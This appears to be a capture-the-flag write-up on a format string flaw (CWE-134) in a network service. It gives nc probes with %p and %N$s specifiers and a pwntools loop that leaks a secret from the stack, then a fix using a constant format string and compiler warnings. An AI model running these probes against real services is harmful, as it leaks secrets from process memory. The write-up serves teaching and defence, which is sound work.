## The flaw

The service calls `printf(line)` with your input as the format string (CWE-134).
Format specifiers in your input are interpreted, not printed, so you can read the
function's stack. The program keeps a pointer to the loaded secret on that stack,
so a single dereference reads the whole string.

## Solving it

1. Connect: `nc target 9002`. Send `%p %p %p %p`. The replies are stack words in
   hex, which proves the input is used as a format string.
2. Walk the stack with positional specifiers: `%1$p`, `%2$p`, and so on. One of
   the words is a pointer into the stack where the secret sits.
3. Dereference it as a string. The pointer sits past the input buffer; in this
   build it is at position 54. Scan `%N$s` until the flag appears. A specifier
   that dereferences a non-pointer closes the connection; reconnect and keep
   going. From the workstation:

   ```python
   from pwn import *
   for n in range(1, 80):
       io = remote("target", 9002)
       io.recvuntil(b"exit.\n")
       io.sendline(f"%{n}$s".encode())
       out = io.recvline(); io.close()
       if b"CTF" in out:
           print(out.decode()); break
   ```

## The fix

Never pass untrusted input as a format string. Use a constant format:
`printf("%s", line)`. Compilers warn about this with `-Wformat -Wformat-security`;
treat those warnings as errors. Keep secrets out of long-lived process memory
where possible, and run the service with least privilege.
